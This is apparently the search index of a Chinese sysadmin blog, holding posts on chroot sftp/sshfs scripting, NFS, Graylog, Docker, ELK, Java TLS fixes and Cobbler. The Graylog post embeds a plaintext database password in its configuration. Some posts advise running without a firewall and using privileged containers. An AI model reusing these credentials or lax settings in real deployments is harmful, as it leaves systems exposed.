PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:~/bin export PATH # 用于在linux之间替代nfs系统 # chroot 系统根目录 CHROOTHOME=\"/chroot_sftp\" # sshfs # 用户配置 SSHFSUID=\"1050\" SSHFSUSER=\"sshfs\" SSHFSROOT=\"/home/${SSHFSUSER}\" # sshfs chroot 映射目录 SSHFSCHROOTDIR=\"${CHROOTHOME}/sshfsdir\" # sshfs 本地共享目录 SSHFSLOCALSHARE=\"/mnt/sshfsdir\" function init_chroot(){ test ! -d ${CHROOTHOME} \u0026\u0026 { mkdir -p ${CHROOTHOME}/{bin,usr,etc,lib64,home,dev,data} mknod -m 666 ${CHROOTHOME}/dev/null c 1 3 mknod -m 666 ${CHROOTHOME}/dev/tty c 5 0 mknod -m 666 ${CHROOTHOME}/dev/zero c 1 5 mknod -m 666 ${CHROOTHOME}/dev/random c 1 8 chmod o+t ${CHROOTHOME}/dev/null ${CHROOTHOME}/dev/tty ${CHROOTHOME}/dev/zero ${CHROOTHOME}/dev/random cd ${CHROOTHOME}/usr ln -sf ../bin ./bin ln -sf ../lib64 ./lib64 cp -p /bin/ls /bin/cat /bin/rm /bin/echo /bin/false /bin/touch /bin/vi /bin/mkdir ${CHROOTHOME}/bin/ for i in /bin/{ls,cat,echo,rm,false,touch,vi,mkdir}; do list=$(ldd ${i} | egrep -o '/lib.*\\.[0-9]') for _so in $list; do /bin/cp -v ${_so} ${CHROOTHOME}${_so} done done } } function config_sshd(){ cat \u003e\u003e /etc/ssh/sshd_config \u003c\u003cEOE Match $1 $2 ChrootDirectory $3 ForceCommand internal-sftp -l INFO -f AUTH X11Forwarding no AllowTcpForwarding no PasswordAuthentication no EOE systemctl restart sshd } # 配置systemd管理模块 # $0 文件名 绑定目录 绑定目标目录 是否只读(默认为空: 读写) # mount -o bind${4:+,ro} 绑定目录 绑定目标目录 function config_systemd(){ cat \u003e /etc/systemd/system/$1 \u003c\u003cEOF # Automatically generated by systemd-fstab-generator [Unit] SourcePath=/etc/fstab Documentation=man:fstab(5) man:systemd-fstab-generator(8) Before=local-fs.target [Mount] What=${2} Where=${3} Type=none Options=defaults,bind${4:+,ro} [Install] WantedBy=multi-user.target EOF systemctl daemon-reload systemctl enable --now $1 } # 初始化sftp可用组 function init_sshfs(){ # 初始sshd配置 config_sshd \"User\" $SSHFSUSER $SSHFSCHROOTDIR # 创建sshfs共享用户 useradd -u ${SSHFSUID} -m -k $(mktemp -d) -d ${SSHFSROOT} -s /bin/false ${SSHFSUSER} # 创建远程登陆密钥 su - ${SSHFSUSER} -s /bin/bash -c \"ssh-keygen -f ~/.ssh/id_rsa -t rsa -b 4096 -N ''\" su - ${SSHFSUSER} -s /bin/bash -c \"cat ~/.ssh/id_rsa.pub \u003e ~/.ssh/authorized_keys \u0026\u0026 chmod 600 ~/.ssh/authorized_keys\" # 创建chroot sshfs共享目录 mkdir -p ${CHROOTHOME}${SSHFSROOT} # 绑定目录主目录 # mount -o ro,bind ${SSHFSROOT} ${CHROOTHOME}${SSHFSROOT} # fstab # cat \u003e\u003e /etc/fstab \u003c\u003cEOF # ${SSHFSROOT} ${CHROOTHOME}${SSHFSROOT} none defaults,ro,bind 0 0 # EOF SYSTEMDFNAME=\"${CHROOTHOME#/}${SSHFSROOT//\\//-}.mount\" # 配置用户帐号映射 config_systemd \"${SYSTEMDFNAME}\" \"${SSHFSROOT}\" \"${CHROOTHOME}${SSHFSROOT}\" 1 # 配置sshfs目录映射 test ! -d ${SSHFSCHROOTDIR} \u0026\u0026 { mkdir -p $SSHFSCHROOTDIR } test ! -d $SSHFSLOCALSHARE \u0026\u0026 { mkdir -p $SSHFSLOCALSHARE } echo \"sshfs 共享目录 \" \u003e $SSHFSLOCALSHARE/readme.md TSSHFSCHROOTDIR=${SSHFSCHROOTDIR#/} config_systemd \"${TSSHFSCHROOTDIR//\\//-}.mount\" \"${SSHFSLOCALSHARE}\" \"${SSHFSCHROOTDIR}\" # cat ${SSHFSROOT}/.ssh/id_rsa } init_chroot # sshfs init_sshfs 节点服务器配置 # 开机启动项 $\u003e vim /etc/fstab sshfsdir@10.0.2.30:/node21 /data/backup fuse.sshfs auto,reconnect,_netdev,user,idmap=user,identityfile=/etc/.ssh/sshfsdir,allow_other,default_permissions,uid=1002,gid=1002 0 0 # zabbix 监控 $\u003e vim /opt/zabbix-agentd/etc/zabbix_agentd.conf.d/sshfs_status.conf UserParameter=sshfs_status,/bin/systemctl is-active data-ltbstore.mount \u003e\u0026 /dev/null \u0026\u0026 echo 0 || echo 1 ","date":"2020-09-23","objectID":"/posts/linux/chroot%E7%B3%BB%E7%BB%9F/:0:0","tags":["linux","chroot","解决方案","sftp","ssh","scripts"],"title":"Chroot系统","uri":"/posts/linux/chroot%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","那些有用没用的"],"content":"NFS部署及autofs替代方案systemd","date":"2020-09-17","objectID":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/","tags":["linux","解决方案","nfs","systemd","autofs"],"title":"NFS部署及autofs替代","uri":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/"},{"categories":["linux","那些有用没用的"],"content":"nfs 服务 部署 $\u003e yum install nfs-utils rpcbind \u0026\u0026 mkdir /nfsshare \u0026\u0026 chown nfsnobody. nfsshare 配置文件说明 /etc/exports 用于管理贡献相关配置的文件 内容格式: NFS共享目录 NFS客户端地址(参数1、参数2…) 客户点地址2（参数1、参数2…）{示例: / master(rw) master2(insecure,rw,all_squash)} NFS贡献目录: NFS实际需要贡献出去的目录 客户端地址: 客户端可以访问贡献目录的地址，可以为主机名、ip地址(网段)、通配符(*) 参数 作用 ro 只读 rw 读写 root_squash 当NFS客户端以root管理员访问时，映射为NFS服务器的匿名用户 no_root_squash 当NFS客户端以root管理员访问时，映射为NFS服务器的root管理员 all_squash 无论NFS客户端使用什么账户访问，均映射为NFS服务器的匿名用户 sync 同时将数据写入到内存与硬盘中，保证不丢失数据 async 优先将数据保存到内存，然后再写入硬盘；这样效率更高，但可能会丢失数据 insecure 是客户端从大于1024的端口发送链接 启动和检查本地共享情况 $\u003e systemctl restart nfs $\u003e showmount -e 127.0.0.1 Export list for 127.0.0.1: /nfsshare * $\u003e cat /var/lib/nfs/etab /nfsshare *(rw,sync,wdelay,hide,nocrossmnt,insecure,root_squash,no_all_squash,no_subtree_check,secure_locks,acl,no_pnfs,anonuid=65534,anongid=65534,sec=sys,rw,insecure,root_squash,no_all_squash) nfs挂载 $\u003e mount.nfs 127.0.0.1:/nfsshare /mnt # 127.0.0.1:/nfshare /mnt nfs defaults 0 0 \u003e\u003e /etc/fstab autofs 自动挂载 使用systemd automount替代 # 创建systemd mount和automount节点，文件名命名规范:挂载到/mnt/other下,名字则必须为: mnt-other.mount 和 mnt-other.automount $\u003e vim /etc/systemd/system/mnt-other.automount [Unit] Documentation=man:fstab(5) man:systemd-fstab-generator(8) [Mount] Where=/mnt/other # 本地挂载目录 What=192.16.10.200:/nfsshare # (远程)挂载点 Type=nfs # 挂载系统类型 Options=defaults # 挂载参数 $\u003e vim /etc/systemd/system/mnt-other.automount [Unit] Documentation=man:fstab(5) man:systemd-fstab-generator(8) [Automount] Where=/mnt/other # 本地挂载目录，同步mount单元的目录 TimeoutIdleSec=12 # 超时时间，多少秒未操作自动卸载挂载点 [Install] WantedBy=multi-user.target # 创建完成后重载配置 $\u003e systemctl daemon-reload # 激活 automount 并加入开机启动项 $\u003e systemctl enable --now mnt-other.automount # 另：automount 在centos 7下可通过fstab配置默认参数noauto,x-systemd.automount 自动创建(systemctl daemon-reload),创建于/run/systemd/generator/下 ","date":"2020-09-17","objectID":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/:0:0","tags":["linux","解决方案","nfs","systemd","autofs"],"title":"NFS部署及autofs替代","uri":"/posts/linux/nfs%E9%83%A8%E7%BD%B2%E5%8F%8Aautofs%E6%9B%BF%E4%BB%A3/"},{"categories":["linux","运维记事"],"content":"Graylog多节点部署","date":"2020-08-13","objectID":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/","tags":["linux","graylog","日志"],"title":"Graylog多节点部署","uri":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/"},{"categories":["linux","运维记事"],"content":"以下记录下graylog多节点部署的过程。附带一个几个日志搜集的配置方法。 此次部署是也是采用dokcer加物理机器混合部署的，各个核心组件均为两个节点。 mongodb集群说的是至少需要3个节点才算是对的，不过这块我也不是很懂，我就只处理了两个节点，另外为什么用docker混合部署，因为mongodb我特么在服务器上直接安装搞不定(所有搞不定的我都会用docker混用！)。这两个问题有了解的希望能指导一下(TODO:应该没有人回来逛我这个站吧，虽然如此，但还是要假装有人说一下的) 1. mongo 集群分片配置(docker) 创建每个成员要使用的副本集密钥文件 $\u003e mkdir -p /data/docker/mongodb \u0026\u0026 cd /data/docker/mongodb $\u003e mkdir .keyfile $\u003e cd .keyfile $\u003e openssl rand -base64 746 \u003e mongodb-keyfile $\u003e chmod 600 mongodb-keyfile $\u003e cd .. $\u003e chown -R 999.999 .keyfile # 999 是为docker内部的mongo用户及其组id mongodb docker-compose 配置文件(分发到每个节点上面,包含第一步生成的密钥文件) 保存并修改以下数据 version: '2' services: # MongoDB: https://hub.docker.com/_/mongo/ mongodb: image: mongo:3 volumes: - /data/docker/mongodb/.keyfile:/data/keyfile:ro - /data/docker/mongodb/db:/data/db - /etc/localtime:/etc/localtime:ro environment: MONGO_INITDB_ROOT_USERNAME: root MONGO_INITDB_ROOT_PASSWORD: \u003cpasswd\u003e command: mongod --auth --keyFile /data/keyfile/mongodb-keyfile --bind_ip_all --wiredTigerCacheSizeGB 1.5 --replSet rs0 ports: - \"27017:27017\" networks: - mongodb networks: mongodb: driver: bridge 初始化副本集、创建用户、授权(一个节点上执行就可以了) $\u003e docker exec -it mongodb_mongodb_1 bash rs0:SECONDARY\u003e mongo -u root -p \u003cpasswd\u003e rs0:SECONDARY\u003e rs.initiate({_id : 'rs0',members: [{ _id : 0, host : \"192.16.10.200:27017\" },{ _id : 1, host : \"192.16.10.201:27017\" }]}) # 此处在后续测试中，两个节点处于非同一网段，或同一网关下出现过`no host described in new configuration 1 for replica set rs0 maps to this node docker`,但未解决，后来换到自己新建的测试机器又正常了 rs0:SECONDARY\u003e rs.status() rs0:SECONDARY\u003e use graylog rs0:PRIMARY\u003e db.createUser( { user: \"graylog\", pwd: \"JlQy8fKAvpPMfLAf\", roles: [ { role: \"readWrite\", db: \"graylog\" } ]}); Successfully added user: { \"user\" : \"graylog\", \"roles\" : [ { \"role\" : \"readWrite\", \"db\" : \"graylog\" } ] } rs0:PRIMARY\u003e db.grantRolesToUser( \"graylog\" , [ { role: \"dbAdmin\", db: \"graylog\" } ]) rs0:PRIMARY\u003e show users { \"_id\" : \"graylog.graylog\", \"userId\" : UUID(\"94720c5f-ddca-4dfb-8252-57e84ba86280\"), \"user\" : \"graylog\", \"db\" : \"graylog\", \"roles\" : [ { \"role\" : \"dbAdmin\", \"db\" : \"graylog\" }, { \"role\" : \"readWrite\", \"db\" : \"graylog\" } ] } rs0:PRIMARY\u003e db.auth(\"graylog\",\"JlQy8fKAvpPMfLAf\") 1 以上mongodb部署完成了。 2. elasticserach 安装配置 导入elasticsearch-oss yum 源 ,安装 (多节点) $\u003e cat /etc/yum.repo.d/elasticsearch.repo [elasticsearch-6.x] name=Elasticsearch repository for 6.x packages baseurl=https://artifacts.elastic.co/packages/oss-6.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md $\u003e yum install elasticsearch-oss -y # 注意安装jdk并导入环境变量 修改elasticsearch 配置文件以下参数 $\u003e grep \"^[a-Z]\" /etc/elasticsearch/elasticsearch.yml cluster.name: graylog # 集群名 node.name: es-node-01 # 节点名(节点名唯一，其他节点注意修改) network.host: 192.16.10.200 # 当前服务器IP discovery.zen.ping.unicast.hosts: [\"192.16.10.200\", \"192.16.10.201\"] # 各个节点 discovery.zen.minimum_master_nodes: 2 启动程序 # yum安装默认也是没有创建elasticsearch默认账号的，需要创建 $\u003e useradd -d /usr/share/elasticsearch -s /sbin/nologin elasticsearch $\u003e systemctl start elasticsearch.service $\u003e systemctl enable elasticsearch.service 3. graylog-server 安装配置 安装 $\u003e rpm -Uvh https://packages.graylog2.org/repo/packages/graylog-2.2-repository_latest.rpm $\u003e sudo yum install graylog-server 修改配置文件 $\u003e vim /etc/graylog/server/server.conf is_master = true # 非主节点需要修改为false password_secret = \u003csecret\u003e # token ， 64位以上随机值，每个节点需要一致，运行中，不可修改 root_username = admin root_password_sha2 = \u003csha256\u003e # 登陆密码, sha256 加密 \u003cecho -n \"Enter Password: \" \u0026\u0026 head -1 \u003c/dev/stdin | tr -d '\\n' | sha256sum | cut -d\" \" -f1\u003e root_email = \u003cexample@mail.com\u003e # 主账号邮箱 root_timezone = Asia/Shanghai # 时区 http_bind_address = 192.16.10.200:9900 # http 代理访问地址,建议绑定网卡ip elasticsearch_hosts = http://192.16.10.200:9200,http://192.16.10.201:9200 # elasticsearch地址，多个逗号隔开 allow_highlighting = true # 搜索结果高亮，默认关闭状态，需要可打开 mongodb_uri = mongodb://graylog:JlQy8fKAvpPMfLAf@192.16.10.200:27017,192.16.10.201:27017/graylog?replicaSet=rs0 # mongodb地址，注意看格式 # transport_email_**** 邮件的相关配置，是前端用来配置告警用的，必须在这儿配置，不过我配置了打死生不了效 启动 $\u003e systemctl start ","date":"2020-08-13","objectID":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/:0:0","tags":["linux","graylog","日志"],"title":"Graylog多节点部署","uri":"/posts/linux/graylog%E5%A4%9A%E8%8A%82%E7%82%B9%E9%83%A8%E7%BD%B2/"},{"categories":["linux","运维记事"],"content":"Docker进阶","date":"2020-07-19","objectID":"/posts/linux/docker%E8%BF%9B%E9%98%B6/","tags":["linux","docker"],"title":"Docker进阶","uri":"/posts/linux/docker%E8%BF%9B%E9%98%B6/"},{"categories":["linux","运维记事"],"content":"volume(卷挂载) 与 bind mount (目录挂载) # 创建卷 [root@00 ~]# docker volume create docker_data docker_data # 查看已有卷 [root@00 ~]# docker volume ls DRIVER VOLUME NAME local docker_data # 产看卷详细信息 [root@00 ~]# docker volume inspect docker_data [ { \"CreatedAt\": \"2019-03-04T14:20:40+08:00\", \"Driver\": \"local\", \"Labels\": {}, \"Mountpoint\": \"/var/lib/docker/volumes/docker_data/_data\", \"Name\": \"docker_data\", \"Options\": {}, \"Scope\": \"local\" } ] # 挂载卷 # 当src值以非/开头时，如果不存在该名字的volume，则自动创建使用，存在则直接使用，若值以/开头，则使用对应当前操作系统对应目录进行挂载,不存在目录会抛出一个错误(但若使用-v参数，则会自动创建对应目录) # 另 volume，若volume为新建，当容器内挂载目录存在数据时，则会将数据挂载到volume中，而bind mount(目录挂载)则会清空容器内挂载目录。 # 若volume为非新建，volume中已经存在数据时，则会将容器内挂载目录数据隐藏并将volume的数据挂载进入容器内目录。 [root@00 ~]# docker run -td --name centos01 --mount src=docker_data,dst=/data centos # docker run -td --name centos01 --v docker_data:/data centos # docker run -td --name centos01 --mount type=bind,src=/data,dst=/data centos # docker run -td --name centos01 --v /data:/data centos 3efe72134d7c796db548f343e5a8b11436271b9bbea2a9b07c2f868257a47247 [root@00 ~]# docker exec -it centos01 ls -d /data /data [root@00 ~]# docker exec -it centos01 touch /data/test{1..4} [root@00 ~]# docker exec -it centos01 ls /data test1 test2 test3 test4 [root@00 ~]# ls -l /var/lib/docker/volumes/docker_data/_data/ 总用量 0 -rw-r--r--. 1 root root 0 3月 4 14:32 test1 -rw-r--r--. 1 root root 0 3月 4 14:32 test2 -rw-r--r--. 1 root root 0 3月 4 14:32 test3 -rw-r--r--. 1 root root 0 3月 4 14:32 test4 # 删除卷(只有删除卷的时候，卷中的数据才会被删除，删除容器不会删除卷数据) [root@00 ~]# docker volume rm docker_data 网络模式 bridge -net=bridge 默认网络，docker启动后创建一个docker0的网桥，默认创建容器也是添加到此网桥中 host -net=host 容器不会获得一个独立的网络空间，而是与宿主机共用一个,这就意味着容器不会有自己的网卡信息，而是使用宿主及的，容器除了网络，其他都是隔离的。 none -net=none 获取独立的网络空间，但不为容器进行任何网络配置，需要手动配置 container -net=container:name/id 与指定容器使用同一个网络空间，具有同样的网络配置信息，两个容器除了网络，其他都是隔离的。 自定义网络 与默认的bridge原理一样 ","date":"2020-07-19","objectID":"/posts/linux/docker%E8%BF%9B%E9%98%B6/:0:0","tags":["linux","docker"],"title":"Docker进阶","uri":"/posts/linux/docker%E8%BF%9B%E9%98%B6/"},{"categories":["linux","运维记事"],"content":"Docker运维故障记录","date":"2020-07-19","objectID":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/","tags":["linux","docker","解决方案"],"title":"Docker运维故障记录","uri":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"docker centos7 镜像 systemctl 报错 Failed to get D-Bus connection: Operation not permitted https://blog.csdn.net/xiaochonghao/article/details/64438246 docker run --privileged -itd -v /sys/fs/cgroup:/sys/fs/cgroup centos /usr/sbin/init docker DOCKER-USER 规则链丢失 https://blog.csdn.net/Liv2005/article/details/112850208 https://docs.docker.com/network/iptables/ DOCKER-USER 是用于控制外部网络与 docker容器网络通信使用的，一般来说重置防火墙会删除所有的自定义规则链，所以重置后，iptables就不会在包含docker创建的那些规则链了。此时，只要主动重启docker服务就可以了。但是这样可能就会产生另一个问题，那就是DOCKER-USER规则链丢失，这个时候只需要主动创建一个网桥，然后删除就可以了(此问题处理可能会导致容器内网络无法正常访问外部网络，见下一个问题)。然后测试下容器内访问外部网络是否正常, 比如容器内需要连接远程数据库。 $\u003e docker network create net-host $\u003e docker network rm net-host docker 容器内无法访问远程服务器网络 当前记录问题产生原因可能是由于上述的DOCKER-USER规则链丢失处理后而产生的新的问题，部署为docker-compose，解决先是down容器，然后重启docker，再重新up容器。后测试容器内网络访问正常。 docker 网络桥联网络无法访问物理机网络问题 当容器以桥连模式启动时是无法访问物理主机网络的,此时需要手动配置下防火墙信任容器的桥连网卡流量 # 如容器启动后的网卡为 br-3630aa8a433b ,则防火墙添加下 $\u003e iptables -A INPUT -i br-3630aa8a433b -j ACCEPT ","date":"2020-07-19","objectID":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:0:0","tags":["linux","docker","解决方案"],"title":"Docker运维故障记录","uri":"/posts/linux/docker%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"Elk日志分析系统","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"elk日志收集系统，elasticsearch(存储+搜索)+logstash(收集)+kibana(展示)综合技术,简称elk 搭建环境: virtualbox5.1.26 centos 6.7 openjdk1.8 elasticsearch 2.x elasticsearch 部署需要安装jdk,openjdk和oraclejdk都可以,由于系统当中原来已经有openjdk了,我这儿就只把jdk升级了下 [root@11 ~]# yum install java-1.8.0-openjdk -y [root@11 ~]# java -version openjdk version \"1.8.0_141\" OpenJDK Runtime Environment (build 1.8.0_141-b16) OpenJDK 64-Bit Server VM (build 25.141-b16, mixed mode) Elasticsearch 安装方式： 下载并安装GPG key，添加elasticsearch源 [root@11 ~]# rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch [root@11 ~]# vim /etc/yum.repos.d/elasticsearch.repo [elasticsearch-2.x] name=Elasticsearch repository for 2.x packages baseurl=http://packages.elastic.co/elasticsearch/2.x/centos gpgcheck=1 gpgkey=http://packages.elastic.co/GPG-KEY-elasticsearch enabled=1 安装，并修改配置信息 [root@11 ~]# yum install -y elasticsearch #-------过程省略----------- [root@11 ~]# vim /etc/elasticsearch/elasticsearch.yml cluster.name: my-11 #集群标识符 node.name: 67-11 #节点名称（集群机器需要修改此节点名称） path.data: /data/es-data #数据存储的目录，这个目录的权限所属的用户和组为elasticsearch(多个逗号隔开) path.logs: /var/log/elasticsearch #日志文件位置 bootstrap.memory_lock: true #保证数据不会写入交换分区，生产环境建议打开，保证性能(可能会导致启动失败，失败时关闭) network.host: 172.16.67.11 #此参数配置的就是自己的ip，多个ip建议配置，默认0.0.0.0（集群机器需要修改此节点名称） http.port: 9200 #默认端口 #discovery.zen.ping.unicast.hosts: [\"172.16.67.11\", \"172.16.67.12\"] #集群配置项，elasticsearch分为组播和单播两种模式。组播所有集群机器的都在同一个组里面，单播 #表示让我们个告诉其他人，除了这台机器还有那些机器，一般默认就可以了（这个地方用virtualbox的nat网络模式作测试的时候，默认的组播模式是无法使用的，需要配置为单播 #模式），这儿可能对于这个组播和单播描述的不是很对，要想详细了解的，自己去查询相关资料吧。还有这个只需要有一台机器配置就可以了。 启动elasticsearch [root@11 ~]# service elasticsearch start #yum安装的，如果这儿启动如果出现了什么问题，一般就是因为防火墙或者对应目录的权限， [root@11 ~]# netstat -lntp|grep java #elasticsearch 主要使用的就是这两个端口 tcp 0 0 ::ffff:172.16.67.11:9200 :::* LISTEN 30464/java tcp 0 0 ::ffff:172.16.67.11:9300 :::* LISTEN 30464/java 使用方式: elasticsearch 使用都是依赖插件，比较好用的有head、kopf [root@11 ~]# /usr/share/elasticsearch/bin/plugin install mobz/elasticsearch-head #主要是elasticsearch集群管理的插件 [root@11 ~]# /usr/share/elasticsearch/bin/plugin install lmenezes/elasticsearch-kopf #相对于head功能更全的一个管理插件 插件安装后，存入目录是在elasticsearch的插件目录 [root@11 ~]# ls -l /usr/share/elasticsearch/plugins/ 总用量 8 drwxr-xr-x. 6 root root 4096 8月 17 03:09 head drwxr-xr-x. 8 root root 4096 8月 17 03:12 kopf 浏览器访问：http://172.16.67.11:9200/_pulgin/head,http://172.16.67.11:9200/_pulgin/kopf 信息: 添加方式：点击‘复合查询’-‘查询’， 第一栏，实际就是你的ip+端口，这个是默认填写好了的。 第二栏，选择post,内容/index-demo/test 第三栏，实际就是一个json串，随便录入后提交就可以了，然后提交就可以了。 添加过后在重新刷新上述页面,就可以看到数据了,上图中的圈中,第一个代表的集群健康值,绿色代表健康,黄色代表警告-没有主分片丢失,红色代表存在数据丢失, 第二个 绿色代表分片,粗线代表主分片,西线代表副本分片. 集群 : 集群的话,配置就只需要改动下配置文件的节点名称,如果你是使用虚拟机模拟nat网络模式的主机,可能需要将主机模式更改为单波模式,这个前面有说明. LogStash 安装方式: 下载并安装GPG key、添加yum仓库 [root@11 ~]# rpm --import https://packages.elastic.co/GPG-KEY-elasticsearch [root@11 ~]# vim /etc/yum.repos.d/logstash.repo [logstash-2.3] name=Logstash repository for 2.3.x packages baseurl=https://packages.elastic.co/logstash/2.3/centos gpgcheck=1 gpgkey=https://packages.elastic.co/GPG-KEY-elasticsearch enabled=1 安装及测试 [root@11 ~]# yum install -y logstash #----------过程省略----------- #----------测试模块start----------- [root@11 ~]# /opt/logstash/bin/logstash -e \"input { stdin{} } output { stdout{codec =\u003e rubydebug} }\" # =\u003e 这儿表示的是等号；stdout {} 格式化输出到前台 Settings: Default pipeline workers: 4 Pipeline main started hello logstash #输入内容 { \"message\" =\u003e \"hello logstash\", \"@version\" =\u003e \"1\", \"@timestamp\" =\u003e \"2017-08-17T17:06:19.892Z\", \"host\" =\u003e \"11\" } [root@11 ~]# /opt/logstash/bin/logstash -e 'input { stdin{} } output { elasticsearch { hosts =\u003e [\"172.16.67.11:9200\"] index =\u003e \"logstash-%{+YYYY.MM.dd}\" } }' Settings: Default pipeline workers: 4 Pipeline main started haha # 读取并写入elasticsearch中,按照日期兴建索引,注意此处是不会打印的 123 # 若要既打印也输出,需要增加其他插件代码.如:output { stdout {} elasticsearch asdf # { hosts =\u003e [\"172.16.67.11:9200\"] index =\u003e \"logstash-%{+YYYY.MM.dd}\" } } eeeeeeeee # # 访问 http://172.16.67.11:9200/_plugin/head 地址下的'数据浏览'查看是否添加成功 #----------测试模块end----------- 配置方式 注意/etc/logstash/conf.d 如果未指定配置文件，logstash默认会加载所有的配置文","date":"2020-07-19","objectID":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/:0:0","tags":["linux","elk","日志"],"title":"Elk日志分析系统","uri":"/posts/linux/elk%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E7%B3%BB%E7%BB%9F/"},{"categories":["linux","运维记事"],"content":"Java运维故障记录","date":"2020-07-19","objectID":"/posts/linux/java%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/","tags":["linux","java","解决方案"],"title":"Java运维故障记录","uri":"/posts/linux/java%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","运维记事"],"content":"1. sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target; 接入大神的说明: https://www.jianshu.com/p/a12906b5d0f0 问题： 原有一个跑了很久的java项目在运行的时候报了上述一个错误，协助开发分析后发现是一个https的问题，检查了调用的接口地址，发现该接口地址的证书已经变成了Let's Encrypt的证书,多方查证后发现Let's Encrypt证书太新，使用的java版本太旧而并未加入根证书导致。解决方案是，要么升级java版本，要么导入根证书到jdk信任当中去。 本次记录加入信任方式 : (异常)测试 $ git clone https://github.com/dimalinux/SSLPing.git $ java -jar SSLPing/dist/SSLPing.jar helloworld.letsencrypt.org 443 # 测试结果如下 : # javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target 解决 $ wget https://letsencrypt.org/certs/lets-encrypt-x3-cross-signed.pem $ keytool -trustcacerts -keystore \"$JAVA_HOME/jre/lib/security/cacerts\" -storepass changeit -noprompt -importcert -alias lets-encrypt-x3-cross-signed -file \"lets-encrypt-x3-cross-signed.pem\" # 导入结果: # Certificate was added to keystore (成功)测试 $ java -jar SSLPing.jar visa.vippay.org 443 Successfully connected 2. nginx 反向代理 Springboot 容器应用，浏览器访问时静态资源间接性502 第一种情况: cookie携带的header泰斗，请求头数据过大 # nginx 调整一下参数 proxy_buffer_size 64k; proxy_buffers 32 32k; proxy_busy_buffers_size 128k; 第二种情况: 防火墙问题，重置就好了(有容器的服务器一定不要开防火墙,不然各种问题) 2. cn.hutool.core.io.IORuntimeException: SSLHandshakeException: Received fatal alert: unrecognized_name 问题： 开发的一个java程序，连接测试环境的api正常，但切换到正式的api就报错 分析：可能，正式环境https 仅支持 tls1.2, 我们使用的JDK可能不支持 解决: 升级JDK 8u111 到 JDK 8u322，就可以了(实际环境, 基础容器 java:8u111 切换到openjdk:8u322) ","date":"2020-07-19","objectID":"/posts/linux/java%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/:0:0","tags":["linux","java","解决方案"],"title":"Java运维故障记录","uri":"/posts/linux/java%E8%BF%90%E7%BB%B4%E6%95%85%E9%9A%9C%E8%AE%B0%E5%BD%95/"},{"categories":["linux","整理收集"],"content":"Cobbler无人值守安装","date":"2020-01-19","objectID":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/","tags":["linux","cobbler","解决方案"],"title":"Cobbler无人值守安装","uri":"/posts/linux/cobbler%E6%97%A0%E4%BA%BA%E5%80%BC%E5%AE%88%E5%AE%89%E8%A3%85/"},{"categories":["linux","整理收集"],"content":" 文章来源 https://www.linuxprobe.com/cobbler-installation-server.html 1. Cobbler 运行流程 Server 端： 第一步：启动 Cobbler 服务 第二步：进行 Cobbler 错误检查，执行 Cobbler check 命令 第三步：进行配置同步，执行 Cobbler sync 命令 第四步：复制相关启动文件文件到 TFTP 目录中 第五步：启动 DHCP 服务，提供地址分配 第六步：DHCP 服务分配 IP 地址 第七步：TFTP 传输启动文件 第八步：Server 端接收安装信息 第九步：Server 端发送 ISO 镜像不 Kickstart 文件 Client 端： 第一步：客户端以 PXE 模式启动 第二步：客户端获取 IP 地址 第三步：通过 TFTP 服务器获取启动文件 第四步：进入 Cobbler 安装选择界面 第五步：客户端确定加载信息 第六步：根据配置信息准备安装系统 第七步：加载 Kickstart 文件 第八步：传输系统安装的其它文件 第九步：进行安装系统 2. 搭建 Cobbler 无人值守安装服务器 2.1. 安装配置 Cobbler 2.1.1. 首先安装 epel-release，Cobbler 和 tftp-server 在 base 源中是没有的 $\u003e yum install -y epel-release 2.1.2. 安装 Cobbler 其实有一部分软件会被当做依赖进行安装上去，比如 tftp 和 httpd 服务，我们这里为了方便可以一并安装，避免后续出现相关问题。 $\u003e yum install -y cobbler cobbler-web dhcp tftp-server pykickstart httpd rsync xinetd 注意: 必须把yum源配好，否则无法全部安装以上软件！ $\u003e vim /etc/yum.repos.d/CentOS-Base.repo #在CentOS-Base.repo配置文件中添加以下源 [aliyun-os] 